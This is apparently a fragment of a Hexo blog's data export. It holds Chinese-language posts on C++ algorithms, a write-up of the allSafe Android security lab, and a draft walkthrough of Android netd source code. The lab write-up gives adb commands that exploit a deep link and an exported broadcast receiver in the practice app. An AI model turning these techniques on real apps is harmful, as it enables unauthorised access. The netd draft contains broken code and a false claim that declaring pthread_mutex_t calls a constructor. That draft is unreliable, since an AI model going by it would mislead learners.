class=\"type\">void</span> <span class=\"title\">Eratosthenes</span><span class=\"params\">(<span class=\"type\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  is_prime[<span class=\"number\">0</span>] = is_prime[<span class=\"number\">1</span>] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">2</span>; i &lt;= n; ++i) is_prime[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">2</span>; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_prime[i]) &#123;</span><br><span class=\"line\">      prime.<span class=\"built_in\">push_back</span>(i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((<span class=\"type\">long</span> <span class=\"type\">long</span>)i * i &gt; n) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = i * i; j &lt;= n; j += i)</span><br><span class=\"line\">        <span class=\"comment\">// 因为从 2 到 i - 1 的倍数我们之前筛过了，这里直接从 i</span></span><br><span class=\"line\">        <span class=\"comment\">// 的倍数开始，提高了运行速度</span></span><br><span class=\"line\">        is_prime[j] = <span class=\"literal\">false</span>;  <span class=\"comment\">// 是 i 的倍数的均不是素数</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>滑动窗口：</p>\n<p>无重复字符的最长子串<br>暴力：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Solution</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">lengthOfLongestSubstring</span><span class=\"params\">(string s)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// std::unordered_map&lt;int,int&gt; tmp;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s.<span class=\"built_in\">length</span>()==<span class=\"number\">0</span>)<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> window_start=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> window_end=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ans =<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;s.<span class=\"built_in\">length</span>();i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> k=window_start;k&lt;=window_end;k++)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(s[k]==s[i])&#123;</span><br><span class=\"line\">                    ans = <span class=\"built_in\">max</span>(ans,window_end-window_start+<span class=\"number\">1</span>);</span><br><span class=\"line\">                    window_start=k+<span class=\"number\">1</span>;</span><br><span class=\"line\">                    window_end = i;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            window_end=i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ans = <span class=\"built_in\">max</span>(ans,window_end-window_start+<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<p>重复字符，用散列表+滑动窗口</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"allSafe","date":"2023-01-25T08:55:12.000Z","_content":"## 1.Deep Link Exploitation \n声明：\n\n        <activity android:theme=\"@style/Theme.Allsafe.NoActionBar\" android:name=\"infosecadventures.allsafe.challenges.DeepLinkTask\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"allsafe\" android:host=\"infosecadventures\" android:pathPrefix=\"/congrats\"/>\n            </intent-filter>\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"https\"/>\n            </intent-filter>\n        </activity>\n代码：\n\n    Intent intent = getIntent();\n    String action = intent.getAction();\n    Uri data = intent.getData();\n\n    Log.d(\"ALLSAFE\", \"Action: \" + action + \" Data: \" + data);\n\n    try {\n        if (data.getQueryParameter(\"key\").equals(getString(R.string.key))) {\n            findViewById(R.id.container).setVisibility(View.VISIBLE);\n            SnackUtil.INSTANCE.simpleMessage(this, \"Good job, you did it!\");\n        } else {\n            SnackUtil.INSTANCE.simpleMessage(this, \"Wrong key, try harder!\");\n        }\n    } catch (Exception e) {\n        SnackUtil.INSTANCE.simpleMessage(this, \"No key provided!\");\n        Log.e(\"ALLSAFE\", e.getMessage());\n    }\n\nadb 命令行：\n\n\tadb shell am start -a android.intent.acton.VIEW -d \"allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c\"\n    \n* scheme host pathPrefix 以及 其余参数\n\nallsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c\n    \n## 2.inSecure Broadcast Receiver\n\n        <receiver\n            android:name=\".challenges.NoteReceiver\"\n            android:exported=\"true\">\n            <intent-filter>\n                <action android:name=\"infosecadventures.allsafe.action.PROCESS_NOTE\" />\n            </intent-filter>\n        </receiver>\n        \n接受代码:\n\n\tString server = intent.getStringExtra(\"server\");\n    String note = intent.getStringExtra(\"note\");\n    String notification_message = intent.getStringExtra(\"notification_message\");\n    \nadb命令：\n\nadb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE --es server \"nuoen.com\" --es note \"thenote\" --es notification_message \"pleasclickme\" -f 0x01000000\n\n加上-f 0x1=01000000 突破隐式广播限制\n\nhttps://www.jianshu.com/p/5283ebc225d5\n\n\n\n","source":"_posts/allSafe.md","raw":"title: allSafe\ndate: 2023-01-25 16:55:12\ntags:\n---\n## 1.Deep Link Exploitation \n声明：\n\n        <activity android:theme=\"@style/Theme.Allsafe.NoActionBar\" android:name=\"infosecadventures.allsafe.challenges.DeepLinkTask\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"allsafe\" android:host=\"infosecadventures\" android:pathPrefix=\"/congrats\"/>\n            </intent-filter>\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"https\"/>\n            </intent-filter>\n        </activity>\n代码：\n\n    Intent intent = getIntent();\n    String action = intent.getAction();\n    Uri data = intent.getData();\n\n    Log.d(\"ALLSAFE\", \"Action: \" + action + \" Data: \" + data);\n\n    try {\n        if (data.getQueryParameter(\"key\").equals(getString(R.string.key))) {\n            findViewById(R.id.container).setVisibility(View.VISIBLE);\n            SnackUtil.INSTANCE.simpleMessage(this, \"Good job, you did it!\");\n        } else {\n            SnackUtil.INSTANCE.simpleMessage(this, \"Wrong key, try harder!\");\n        }\n    } catch (Exception e) {\n        SnackUtil.INSTANCE.simpleMessage(this, \"No key provided!\");\n        Log.e(\"ALLSAFE\", e.getMessage());\n    }\n\nadb 命令行：\n\n\tadb shell am start -a android.intent.acton.VIEW -d \"allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c\"\n    \n* scheme host pathPrefix 以及 其余参数\n\nallsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c\n    \n## 2.inSecure Broadcast Receiver\n\n        <receiver\n            android:name=\".challenges.NoteReceiver\"\n            android:exported=\"true\">\n            <intent-filter>\n                <action android:name=\"infosecadventures.allsafe.action.PROCESS_NOTE\" />\n            </intent-filter>\n        </receiver>\n        \n接受代码:\n\n\tString server = intent.getStringExtra(\"server\");\n    String note = intent.getStringExtra(\"note\");\n    String notification_message = intent.getStringExtra(\"notification_message\");\n    \nadb命令：\n\nadb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE --es server \"nuoen.com\" --es note \"thenote\" --es notification_message \"pleasclickme\" -f 0x01000000\n\n加上-f 0x1=01000000 突破隐式广播限制\n\nhttps://www.jianshu.com/p/5283ebc225d5\n\n\n\n","slug":"allSafe","published":1,"updated":"2023-12-28T12:55:47.614Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit1000lv8fyd7ss4meh","content":"<h2 id=\"1-Deep-Link-Exploitation\"><a href=\"#1-Deep-Link-Exploitation\" class=\"headerlink\" title=\"1.Deep Link Exploitation\"></a>1.Deep Link Exploitation</h2><p>声明：</p>\n<pre><code>    &lt;activity android:theme=&quot;@style/Theme.Allsafe.NoActionBar&quot; android:name=&quot;infosecadventures.allsafe.challenges.DeepLinkTask&quot;&gt;\n        &lt;intent-filter&gt;\n            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;\n            &lt;data android:scheme=&quot;allsafe&quot; android:host=&quot;infosecadventures&quot; android:pathPrefix=&quot;/congrats&quot;/&gt;\n        &lt;/intent-filter&gt;\n        &lt;intent-filter&gt;\n            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;\n            &lt;data android:scheme=&quot;https&quot;/&gt;\n        &lt;/intent-filter&gt;\n    &lt;/activity&gt;\n</code></pre>\n<p>代码：</p>\n<pre><code>Intent intent = getIntent();\nString action = intent.getAction();\nUri data = intent.getData();\n\nLog.d(&quot;ALLSAFE&quot;, &quot;Action: &quot; + action + &quot; Data: &quot; + data);\n\ntry &#123;\n    if (data.getQueryParameter(&quot;key&quot;).equals(getString(R.string.key))) &#123;\n        findViewById(R.id.container).setVisibility(View.VISIBLE);\n        SnackUtil.INSTANCE.simpleMessage(this, &quot;Good job, you did it!&quot;);\n    &#125; else &#123;\n        SnackUtil.INSTANCE.simpleMessage(this, &quot;Wrong key, try harder!&quot;);\n    &#125;\n&#125; catch (Exception e) &#123;\n    SnackUtil.INSTANCE.simpleMessage(this, &quot;No key provided!&quot;);\n    Log.e(&quot;ALLSAFE&quot;, e.getMessage());\n&#125;\n</code></pre>\n<p>adb 命令行：</p>\n<pre><code>adb shell am start -a android.intent.acton.VIEW -d &quot;allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c&quot;\n</code></pre>\n<ul>\n<li>scheme host pathPrefix 以及 其余参数</li>\n</ul>\n<p>allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</p>\n<h2 id=\"2-inSecure-Broadcast-Receiver\"><a href=\"#2-inSecure-Broadcast-Receiver\" class=\"headerlink\" title=\"2.inSecure Broadcast Receiver\"></a>2.inSecure Broadcast Receiver</h2><pre><code>    &lt;receiver\n        android:name=&quot;.challenges.NoteReceiver&quot;\n        android:exported=&quot;true&quot;&gt;\n        &lt;intent-filter&gt;\n            &lt;action android:name=&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot; /&gt;\n        &lt;/intent-filter&gt;\n    &lt;/receiver&gt;\n    \n</code></pre>\n<p>接受代码:</p>\n<pre><code>String server = intent.getStringExtra(&quot;server&quot;);\nString note = intent.getStringExtra(&quot;note&quot;);\nString notification_message = intent.getStringExtra(&quot;notification_message&quot;);\n</code></pre>\n<p>adb命令：</p>\n<p>adb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE –es server “nuoen.com” –es note “thenote” –es notification_message “pleasclickme” -f 0x01000000</p>\n<p>加上-f 0x1=01000000 突破隐式广播限制</p>\n<p><a href=\"https://www.jianshu.com/p/5283ebc225d5\">https://www.jianshu.com/p/5283ebc225d5</a></p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<h2 id=\"1-Deep-Link-Exploitation\"><a href=\"#1-Deep-Link-Exploitation\" class=\"headerlink\" title=\"1.Deep Link Exploitation\"></a>1.Deep Link Exploitation</h2><p>声明：</p>\n<pre><code>    &lt;activity android:theme=&quot;@style/Theme.Allsafe.NoActionBar&quot; android:name=&quot;infosecadventures.allsafe.challenges.DeepLinkTask&quot;&gt;\n        &lt;intent-filter&gt;\n            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;\n            &lt;data android:scheme=&quot;allsafe&quot; android:host=&quot;infosecadventures&quot; android:pathPrefix=&quot;/congrats&quot;/&gt;\n        &lt;/intent-filter&gt;\n        &lt;intent-filter&gt;\n            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;\n            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;\n            &lt;data android:scheme=&quot;https&quot;/&gt;\n        &lt;/intent-filter&gt;\n    &lt;/activity&gt;\n</code></pre>\n<p>代码：</p>\n<pre><code>Intent intent = getIntent();\nString action = intent.getAction();\nUri data = intent.getData();\n\nLog.d(&quot;ALLSAFE&quot;, &quot;Action: &quot; + action + &quot; Data: &quot; + data);\n\ntry &#123;\n    if (data.getQueryParameter(&quot;key&quot;).equals(getString(R.string.key))) &#123;\n        findViewById(R.id.container).setVisibility(View.VISIBLE);\n        SnackUtil.INSTANCE.simpleMessage(this, &quot;Good job, you did it!&quot;);\n    &#125; else &#123;\n        SnackUtil.INSTANCE.simpleMessage(this, &quot;Wrong key, try harder!&quot;);\n    &#125;\n&#125; catch (Exception e) &#123;\n    SnackUtil.INSTANCE.simpleMessage(this, &quot;No key provided!&quot;);\n    Log.e(&quot;ALLSAFE&quot;, e.getMessage());\n&#125;\n</code></pre>\n<p>adb 命令行：</p>\n<pre><code>adb shell am start -a android.intent.acton.VIEW -d &quot;allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c&quot;\n</code></pre>\n<ul>\n<li>scheme host pathPrefix 以及 其余参数</li>\n</ul>\n<p>allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</p>\n<h2 id=\"2-inSecure-Broadcast-Receiver\"><a href=\"#2-inSecure-Broadcast-Receiver\" class=\"headerlink\" title=\"2.inSecure Broadcast Receiver\"></a>2.inSecure Broadcast Receiver</h2><pre><code>    &lt;receiver\n        android:name=&quot;.challenges.NoteReceiver&quot;\n        android:exported=&quot;true&quot;&gt;\n        &lt;intent-filter&gt;\n            &lt;action android:name=&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot; /&gt;\n        &lt;/intent-filter&gt;\n    &lt;/receiver&gt;\n    \n</code></pre>\n<p>接受代码:</p>\n<pre><code>String server = intent.getStringExtra(&quot;server&quot;);\nString note = intent.getStringExtra(&quot;note&quot;);\nString notification_message = intent.getStringExtra(&quot;notification_message&quot;);\n</code></pre>\n<p>adb命令：</p>\n<p>adb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE –es server “nuoen.com” –es note “thenote” –es notification_message “pleasclickme” -f 0x01000000</p>\n<p>加上-f 0x1=01000000 突破隐式广播限制</p>\n<p><a href=\"https://www.jianshu.com/p/5283ebc225d5\">https://www.jianshu.com/p/5283ebc225d5</a></p>\n"},{"_content":"netd 解析 \nsystem/netd/server/main.cpp\n\n初始化NetlinkManager\nNetlinkManager *nm = NetlinkManager::Instance();\n    NetlinkManager *NetlinkManager::Instance() {\n    if (!sInstance)\n        sInstance = new NetlinkManager();\n    return sInstance;\n}\n\n    NetlinkManager::NetlinkManager() {\n        mBroadcaster = nullptr;\n    }\n开始\nif (nm->start()) {\n    ALOGE(\"Unable to start NetlinkManager (%s)\", strerror(errno));\n    exit(1);\n}\nint NetlinkManager::start() {\n    if ((mUeventHandler = setupSocket(&mUeventSock, NETLINK_KOBJECT_UEVENT,\n         0xffffffff, NetlinkListener::NETLINK_FORMAT_ASCII, false)) == nullptr) {\n        return -1;\n    }\n\n    if ((mRouteHandler = setupSocket(&mRouteSock, NETLINK_ROUTE,\n                                     RTMGRP_LINK |\n                                     RTMGRP_IPV4_IFADDR |\n                                     RTMGRP_IPV6_IFADDR |\n                                     RTMGRP_IPV6_ROUTE |\n                                     (1 << (RTNLGRP_ND_USEROPT - 1)),\n         NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) {\n        return -1;\n    }\n\n    if ((mQuotaHandler = setupSocket(&mQuotaSock, NETLINK_NFLOG,\n            NFLOG_QUOTA_GROUP, NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) {\n        ALOGW(\"Unable to open qlog quota socket, check if xt_quota2 can send via UeventHandler\");\n        // TODO: return -1 once the emulator gets a new kernel.\n    }\n\n    if ((mStrictHandler = setupSocket(&mStrictSock, NETLINK_NETFILTER,\n            0, NetlinkListener::NETLINK_FORMAT_BINARY_UNICAST, true)) == nullptr) {\n        ALOGE(\"Unable to open strict socket\");\n        // TODO: return -1 once the emulator gets a new kernel.\n    }\n\n    return 0;\n}\nNetlinkHandler *NetlinkManager::setupSocket(int *sock, int netlinkFamily,\n    int groups, int format, bool configNflog){\n    //初始化sock 地址\n    struct sockaddr_nl nladdr;\n    int sz = 64 * 1024;\n    int on = 1;\n\n    memset(&nladdr, 0, sizeof(nladdr));\n    nladdr.nl_family = AF_NETLINK;\n    // Kernel will assign a unique nl_pid if set to zero.\n    nladdr.nl_pid = 0;\n    nladdr.nl_groups = groups;\n    // 创建socket\n    if ((*sock = socket(PF_NETLINK, SOCK_DGRAM | SOCK_CLOEXEC, netlinkFamily)) < 0) {\n    ALOGE(\"Unable to create netlink socket for family %d: %s\", netlinkFamily, strerror(errno));\n    return nullptr;}\n    '''\n    // 绑定sock\n    if (bind(*sock, (struct sockaddr *) &nladdr, sizeof(nladdr)) < 0) {\n    ALOGE(\"Unable to bind netlink socket: %s\", strerror(errno));\n    close(*sock);\n    return nullptr;}\n    // \n    NetlinkHandler *handler = new NetlinkHandler(this, *sock, format);\n    if (handler->start()) {\n        ALOGE(\"Unable to start NetlinkHandler: %s\", strerror(errno));\n        close(*sock);\n        return nullptr;\n    }\n}\n\nNetlinkHandler 继承了SocketListener\npthread_mutex_t         mClientsLock;\n\nvoid SocketListener::init(const char *socketName, int socketFd, bool listen, bool useCmdNum) {\n    mListen = listen;\n    mSocketName = socketName;\n    mSock = socketFd;\n    mUseCmdNum = useCmdNum;\n    pthread_mutex_init(&mClientsLock, nullptr);\n}\n对于mClientsLock 声明后直接能用：\n在C++中，当你声明一个变量，包括一个类的实例时，不管其构造函数在声明点是否已经被明确调用，该变量都会在内存中被分配空间，并且其地址可以被取用和使用。\n当你声明pthread_mutex_t mClientsLock;时，这条语句做了两件事：\n\n内存分配：它为类pthread_mutex_t的一个实例分配内存空间。这意味着有一个特定的内存位置被设置来存储属于mClientsLock的所有数据。\n\n构造函数调用：它自动调用了默认构造函数A::A()，这就是为什么你会看到控制台上打印出\"the A() call\"。这是对象初始化过程的一部分。","source":"_drafts/netd.md","raw":"netd 解析 \nsystem/netd/server/main.cpp\n\n初始化NetlinkManager\nNetlinkManager *nm = NetlinkManager::Instance();\n    NetlinkManager *NetlinkManager::Instance() {\n    if (!sInstance)\n        sInstance = new NetlinkManager();\n    return sInstance;\n}\n\n    NetlinkManager::NetlinkManager() {\n        mBroadcaster = nullptr;\n    }\n开始\nif (nm->start()) {\n    ALOGE(\"Unable to start NetlinkManager (%s)\", strerror(errno));\n    exit(1);\n}\nint NetlinkManager::start() {\n    if ((mUeventHandler = setupSocket(&mUeventSock, NETLINK_KOBJECT_UEVENT,\n         0xffffffff, NetlinkListener::NETLINK_FORMAT_ASCII, false)) == nullptr) {\n        return -1;\n    }\n\n    if ((mRouteHandler = setupSocket(&mRouteSock, NETLINK_ROUTE,\n                                     RTMGRP_LINK |\n                                     RTMGRP_IPV4_IFADDR |\n                                     RTMGRP_IPV6_IFADDR |\n                                     RTMGRP_IPV6_ROUTE |\n                                     (1 << (RTNLGRP_ND_USEROPT - 1)),\n         NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) {\n        return -1;\n    }\n\n    if ((mQuotaHandler = setupSocket(&mQuotaSock, NETLINK_NFLOG,\n            NFLOG_QUOTA_GROUP, NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) {\n        ALOGW(\"Unable to open qlog quota socket, check if xt_quota2 can send via UeventHandler\");\n        // TODO: return -1 once the emulator gets a new kernel.\n    }\n\n    if ((mStrictHandler = setupSocket(&mStrictSock, NETLINK_NETFILTER,\n            0, NetlinkListener::NETLINK_FORMAT_BINARY_UNICAST, true)) == nullptr) {\n        ALOGE(\"Unable to open strict socket\");\n        // TODO: return -1 once the emulator gets a new kernel.\n    }\n\n    return 0;\n}\nNetlinkHandler *NetlinkManager::setupSocket(int *sock, int netlinkFamily,\n    int groups, int format, bool configNflog){\n    //初始化sock 地址\n    struct sockaddr_nl nladdr;\n    int sz = 64 * 1024;\n    int on = 1;\n\n    memset(&nladdr, 0, sizeof(nladdr));\n    nladdr.nl_family = AF_NETLINK;\n    // Kernel will assign a unique nl_pid if set to zero.\n    nladdr.nl_pid = 0;\n    nladdr.nl_groups = groups;\n    // 创建socket\n    if ((*sock = socket(PF_NETLINK, SOCK_DGRAM | SOCK_CLOEXEC, netlinkFamily)) < 0) {\n    ALOGE(\"Unable to create netlink socket for family %d: %s\", netlinkFamily, strerror(errno));\n    return nullptr;}\n    '''\n    // 绑定sock\n    if (bind(*sock, (struct sockaddr *) &nladdr, sizeof(nladdr)) < 0) {\n    ALOGE(\"Unable to bind netlink socket: %s\", strerror(errno));\n    close(*sock);\n    return nullptr;}\n    // \n    NetlinkHandler *handler = new NetlinkHandler(this, *sock, format);\n    if (handler->start()) {\n        ALOGE(\"Unable to start NetlinkHandler: %s\", strerror(errno));\n        close(*sock);\n        return nullptr;\n    }\n}\n\nNetlinkHandler 继承了SocketListener\npthread_mutex_t         mClientsLock;\n\nvoid SocketListener::init(const char *socketName, int socketFd, bool listen, bool useCmdNum) {\n    mListen = listen;\n    mSocketName = socketName;\n    mSock = socketFd;\n    mUseCmdNum = useCmdNum;\n    pthread_mutex_init(&mClientsLock, nullptr);\n}\n对于mClientsLock 声明后直接能用：\n在C++中，当你声明一个变量，包括一个类的实例时，不管其构造函数在声明点是否已经被明确调用，该变量都会在内存中被分配空间，并且其地址可以被取用和使用。\n当你声明pthread_mutex_t mClientsLock;时，这条语句做了两件事：\n\n内存分配：它为类pthread_mutex_t的一个实例分配内存空间。这意味着有一个特定的内存位置被设置来存储属于mClientsLock的所有数据。\n\n构造函数调用：它自动调用了默认构造函数A::A()，这就是为什么你会看到控制台上打印出\"the A() call\"。这是对象初始化过程的一部分。","slug":"netd","published":0,"date":"2024-04-01T11:29:40.962Z","updated":"2024-04-01T12:52:06.709Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit1000mv8fyhbhk5nu1","content":"<p>netd 解析<br>system/netd/server/main.cpp</p>\n<p>初始化NetlinkManager<br>NetlinkManager *nm = NetlinkManager::Instance();<br>    NetlinkManager *NetlinkManager::Instance() {<br>    if (!sInstance)<br>        sInstance = new NetlinkManager();<br>    return sInstance;<br>}</p>\n<pre><code>NetlinkManager::NetlinkManager() &#123;\n    mBroadcaster = nullptr;\n&#125;\n</code></pre>\n<p>开始<br>if (nm-&gt;start()) {<br>    ALOGE(“Unable to start NetlinkManager (%s)”, strerror(errno));<br>    exit(1);<br>}<br>int NetlinkManager::start() {<br>    if ((mUeventHandler = setupSocket(&amp;mUeventSock, NETLINK_KOBJECT_UEVENT,<br>         0xffffffff, NetlinkListener::NETLINK_FORMAT_ASCII, false)) == nullptr) {<br>        return -1;<br>    }</p>\n<pre><code>if ((mRouteHandler = setupSocket(&amp;mRouteSock, NETLINK_ROUTE,\n                                 RTMGRP_LINK |\n                                 RTMGRP_IPV4_IFADDR |\n                                 RTMGRP_IPV6_IFADDR |\n                                 RTMGRP_IPV6_ROUTE |\n                                 (1 &lt;&lt; (RTNLGRP_ND_USEROPT - 1)),\n     NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) &#123;\n    return -1;\n&#125;\n\nif ((mQuotaHandler = setupSocket(&amp;mQuotaSock, NETLINK_NFLOG,\n        NFLOG_QUOTA_GROUP, NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) &#123;\n    ALOGW(&quot;Unable to open qlog quota socket, check if xt_quota2 can send via UeventHandler&quot;);\n    // TODO: return -1 once the emulator gets a new kernel.\n&#125;\n\nif ((mStrictHandler = setupSocket(&amp;mStrictSock, NETLINK_NETFILTER,\n        0, NetlinkListener::NETLINK_FORMAT_BINARY_UNICAST, true)) == nullptr) &#123;\n    ALOGE(&quot;Unable to open strict socket&quot;);\n    // TODO: return -1 once the emulator gets a new kernel.\n&#125;\n\nreturn 0;\n</code></pre>\n<p>}<br>NetlinkHandler *NetlinkManager::setupSocket(int *sock, int netlinkFamily,<br>    int groups, int format, bool configNflog){<br>    //初始化sock 地址<br>    struct sockaddr_nl nladdr;<br>    int sz = 64 * 1024;<br>    int on = 1;</p>\n<pre><code>memset(&amp;nladdr, 0, sizeof(nladdr));\nnladdr.nl_family = AF_NETLINK;\n// Kernel will assign a unique nl_pid if set to zero.\nnladdr.nl_pid = 0;\nnladdr.nl_groups = groups;\n// 创建socket\nif ((*sock = socket(PF_NETLINK, SOCK_DGRAM | SOCK_CLOEXEC, netlinkFamily)) &lt; 0) &#123;\nALOGE(&quot;Unable to create netlink socket for family %d: %s&quot;, netlinkFamily, strerror(errno));\nreturn nullptr;&#125;\n&#39;&#39;&#39;\n// 绑定sock\nif (bind(*sock, (struct sockaddr *) &amp;nladdr, sizeof(nladdr)) &lt; 0) &#123;\nALOGE(&quot;Unable to bind netlink socket: %s&quot;, strerror(errno));\nclose(*sock);\nreturn nullptr;&#125;\n// \nNetlinkHandler *handler = new NetlinkHandler(this, *sock, format);\nif (handler-&gt;start()) &#123;\n    ALOGE(&quot;Unable to start NetlinkHandler: %s&quot;, strerror(errno));\n    close(*sock);\n    return nullptr;\n&#125;\n</code></pre>\n<p>}</p>\n<p>NetlinkHandler 继承了SocketListener<br>pthread_mutex_t         mClientsLock;</p>\n<p>void SocketListener::init(const char *socketName, int socketFd, bool listen, bool useCmdNum) {<br>    mListen = listen;<br>    mSocketName = socketName;<br>    mSock = socketFd;<br>    mUseCmdNum = useCmdNum;<br>    pthread_mutex_init(&amp;mClientsLock, nullptr);<br>}<br>对于mClientsLock 声明后直接能用：<br>在C++中，当你声明一个变量，包括一个类的实例时，不管其构造函数在声明点是否已经被明确调用，该变量都会在内存中被分配空间，并且其地址可以被取用和使用。<br>当你声明pthread_mutex_t mClientsLock;时，这条语句做了两件事：</p>\n<p>内存分配：它为类pthread_mutex_t的一个实例分配内存空间。这意味着有一个特定的内存位置被设置来存储属于mClientsLock的所有数据。</p>\n<p>构造函数调用：它自动调用了默认构造函数A::A()，这就是为什么你会看到控制台上打印出”the A() call”。这是对象初始化过程的一部分。</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>netd 解析<br>system/netd/server/main.cpp</p>\n<p>初始化NetlinkManager<br>NetlinkManager *nm = NetlinkManager::Instance();<br>    NetlinkManager *NetlinkManager::Instance() {<br>    if (!sInstance)<br>        sInstance = new NetlinkManager();<br>    return sInstance;<br>}</p>\n<pre><code>NetlinkManager::NetlinkManager() &#123;\n    mBroadcaster = nullptr;\n&#125;\n</code></pre>\n<p>开始<br>if (nm-&gt;start()) {<br>    ALOGE(“Unable to start NetlinkManager (%s)”, strerror(errno));<br>    exit(1);<br>}<br>int NetlinkManager::start() {<br>    if ((mUeventHandler = setupSocket(&amp;mUeventSock, NETLINK_KOBJECT_UEVENT,<br>         0xffffffff, NetlinkListener::NETLINK_FORMAT_ASCII, false)) == nullptr) {<br>        return -1;<br>    }</p>\n<pre><code>if ((mRouteHandler = setupSocket(&amp;mRouteSock, NETLINK_ROUTE,\n                                 RTMGRP_LINK |\n                                 RTMGRP_IPV4_IFADDR |\n                                 RTMGRP_IPV6_IFADDR |\n                                 